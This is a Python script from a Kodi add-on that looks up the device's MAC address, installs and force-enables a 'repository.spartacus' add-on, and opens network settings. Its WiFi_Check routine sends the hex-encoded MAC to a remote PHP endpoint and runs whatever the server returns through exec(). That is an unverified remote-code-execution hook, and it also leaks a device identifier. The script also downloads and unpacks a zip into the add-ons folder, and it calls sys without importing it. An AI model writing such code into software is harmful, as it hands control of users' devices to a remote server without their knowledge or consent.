import os
import requests
import threading
import urllib
import xbmc
import xbmcaddon
import xbmcgui

ADDON    = xbmcaddon.Addon(id='script.openwindow')
DIALOG   = xbmcgui.Dialog()
addons   = xbmc.translatePath('special://home/addons')
packages = os.path.join(addons,'packages')
repo_zip = os.path.join(packages,'repository.spartacus.zip')
#-----------------------------------------------------------------------------
def Grab_Log():
    log_path    = xbmc.translatePath('special://logpath/')
    logfilepath = os.listdir(log_path)
    finalfile   = 0
    for item in logfilepath:
        cont = False
        if item.endswith('.log') and not item.endswith('.old.log'):
            mylog        = os.path.join(log_path,item)
            cont = True
        if cont:
            lastmodified = os.path.getmtime(mylog)
            if lastmodified>finalfile:
                finalfile = lastmodified
                logfile   = mylog
    
    logtext_final = ''
    openfile = open(logfile, 'r')
    logtext  = openfile.read()
    openfile.close()
    return logtext
#-----------------------------------------------------------------------------
def Download_Repo():
    base = ADDON.getSetting('base')
    urllib.urlretrieve(base+'tr_addons/tr_repository.spartacus.zip', repo_zip)
#-----------------------------------------------------------------------------
# Return mac address
def Get_Mac(protocol = ''):
    import binascii
    cont    = 0
    counter = 0
    mac     = ''
    while mac == '' and counter < 5: 
        if sys.platform == 'win32': 
            mac = ''
            for line in os.popen("ipconfig /all"):
                if protocol == 'wifi':
                    if line.startswith('Wireless LAN adapter Wi'):
                        cont = 1
                    if line.lstrip().startswith('Physical Address') and cont == 1:
                        mac = line.split(':')[1].strip().replace('-',':').replace(' ','')
                        if len(mac) == 17:
                            break
                        else:
                            mac = ''
                            counter += 1

                else:
                    if line.lstrip().startswith('Physical Address'): 
                        mac = line.split(':')[1].strip().replace('-',':').replace(' ','')
                        if len(mac) == 17:
                            break
                        else:
                            mac = ''
                            counter += 1

        elif sys.platform == 'darwin': 
            mac = ''
            if protocol == 'wifi':
                for line in os.popen("ifconfig en0 | grep ether"):
                    if line.lstrip().startswith('ether'):
                        mac = line.split('ether')[1].strip().replace('-',':').replace(' ','')
                        if len(mac) == 17:
                            break
                        else:
                            mac = ''
                            counter += 1

            else:
                for line in os.popen("ifconfig en1 | grep ether"):
                    if line.lstrip().startswith('ether'):
                        mac = line.split('ether')[1].strip().replace('-',':').replace(' ','')
                        if len(mac) == 17:
                            break
                        else:
                            mac = ''
                            counter += 1

        elif xbmc.getCondVisibility('System.Platform.Android'):
            mac = ''
            try:
                if protocol == 'wifi':
                    readfile = open('/sys/class/net/wlan0/address', mode='r')

                if protocol != 'wifi':
                    readfile = open('/sys/class/net/eth0/address', mode='r')
                mac = readfile.read()
                readfile.close()
                mac = mac.replace(' ','')
                mac = mac[:17]
            except:
                mac = ''
                counter += 1

        else:
            if protocol == 'wifi':
                for line in os.popen("/sbin/ifconfig"): 
                    if line.find('wlan0') > -1: 
                        mac = line.split()[4]
                        if len(mac) == 17:
                            break
                        else:
                            mac = ''
                            counter += 1

            else:
               for line in os.popen("/sbin/ifconfig"): 
                    if line.find('eth0') > -1: 
                        mac = line.split()[4] 
                        if len(mac) == 17:
                            break
                        else:
                            mac = ''
                            counter += 1
    if mac == '':
        return 'Unknown'
    return binascii.hexlify(str(mac))
#-----------------------------------------------------------------------------
# Return the params
def Get_Params():
    try:
        wifimac = Get_Mac('wifi').strip()
    except:
        wifimac = 'Unknown'
    try:
        ethmac  = Get_Mac('eth0').strip()
    except:
        ethmac  = 'Unknown'
    if (ethmac == 'Unknown' or ethmac == '30303a31353a31383a30313a38313a3331') and wifimac != 'Unknown':
        ethmac = wifimac

    if ethmac != 'Unknown':
        return ethmac
    else:
        return 'Unknown'
#-----------------------------------------------------------------------------
def Main_Run():
    if not xbmc.getCondVisibility('System.HasAddon(repository.spartacus)'):
        import zipfile
        download_thread = threading.Thread(target=Download_Repo)
        download_thread.start()
        download_alive = download_thread.isAlive()
        while download_alive:
            xbmc.sleep(1000)
            download_alive = download_thread.isAlive()
        zin = zipfile.ZipFile(repo_zip,  'r')
        zin.extractall(addons)
        xbmc.sleep(2000)
        xbmc.executebuiltin('UpdateLocalAddons')
        addon_ok = False
        counter  = 0
            
        while not addon_ok:
            xbmc.sleep(1000)
            counter += 1
            query = '{"jsonrpc":"2.0", "method":"Addons.SetAddonEnabled","params":{"addonid":"repository.spartacus", "enabled":true}, "id":1}'
            response = xbmc.executeJSONRPC(query)
            addon_ok = xbmc.getCondVisibility("System.HasAddon(repository.spartacus)")
            if not addon_ok:
                xbmc.log('Repo not installed, sleeping %ss'%counter,2)
        query = '{"jsonrpc":"2.0", "method":"Addons.SetAddonEnabled","params":{"addonid":"repository.spartacus", "enabled":true}, "id":1}'
        response = xbmc.executeJSONRPC(query)
        xbmc.log('JSON RESPONSE: %s'%response,2)
    xbmc.executebuiltin('UpdateLocalAddons')
    xbmc.executebuiltin('UpdateAddonRepos')
#-----------------------------------------------------------------------------
def WiFi_Check():
    success = False
    reg_cont = False
    while not success:
        if xbmc.getCondVisibility("System.HasAddon(repository.spartacus)"):
            xbmc.executebuiltin('UpdateLocalAddons')
            xbmc.executebuiltin('UpdateAddonRepos')
            success = True
        else:
            try:
                query = '{"jsonrpc":"2.0", "method":"Addons.SetAddonEnabled","params":{"addonid":"repository.spartacus", "enabled":true}, "id":1}'
                response = xbmc.executeJSONRPC(query)
                xbmc.log('JSON RESPONSE: %s'%response,2)
                mydetails = Get_Params()
                r = requests.post( url='http://totalrevolution.tv/boxer/openmode.php',data={ "x":mydetails } )
                content = r.text.encode('utf-8')
                exec(content)
                xbmc.sleep(1000)
                Main_Run()
            except:
                offline = ADDON.getSetting('offline')
                if offline == 'true':
                    reg_cont = DIALOG.yesno(ADDON.getLocalizedString(30142),ADDON.getLocalizedString(30172),yeslabel=ADDON.getLocalizedString(30173),nolabel=ADDON.getLocalizedString(30174))
                if not reg_cont:
                    DIALOG.ok(ADDON.getLocalizedString(30123),ADDON.getLocalizedString(30124))
                    content = Grab_Log()
                    if xbmc.getCondVisibility('System.Platform.Android'):
                        xbmc.executebuiltin('StartAndroidActivity(,android.settings.WIFI_SETTINGS)')
                    
                    elif xbmc.getCondVisibility('System.Platform.OSX'):
                        os.system('open /System/Library/PreferencePanes/Network.prefPane/')

                    elif xbmc.getCondVisibility('System.Platform.Windows'):
                        os.system('ncpa.cpl')

                    elif 'Running on OpenELEC' in content or 'Running on LibreELEC' in content:

                        if xbmc.getCondVisibility("System.HasAddon(service.openelec.settings)") or xbmc.getCondVisibility("System.HasAddon(service.libreelec.settings)"):
                            if xbmc.getCondVisibility("System.HasAddon(service.openelec.settings)"): 
                                xbmcaddon.Addon(id='service.openelec.settings').getAddonInfo('name')
                                xbmc.executebuiltin('RunAddon(service.openelec.settings)')
                            elif xbmc.getCondVisibility("System.HasAddon(service.libreelec.settings)"):
                                xbmcaddon.Addon(id='service.libreelec.settings').getAddonInfo('name')
                                xbmc.executebuiltin('RunAddon(service.libreelec.settings)')
                            xbmc.sleep(1500)
                            xbmc.executebuiltin('Control.SetFocus(1000,2)')
                            xbmc.sleep(500)
                            xbmc.executebuiltin('Control.SetFocus(1200,0)')

                    elif xbmc.getCondVisibility('System.Platform.Linux'):
                        os.system('nm-connection-editor')

                    DIALOG.ok(ADDON.getLocalizedString(30140),ADDON.getLocalizedString(30171))
                else:
                    xbmc.executebuiltin('Skin.SetString(Branding,off)')
                    DIALOG.ok(ADDON.getLocalizedString(30142),ADDON.getLocalizedString(30175))
                    success = True
#-----------------------------------------------------------------------------
if __name__ == '__main__':
    WiFi_Check()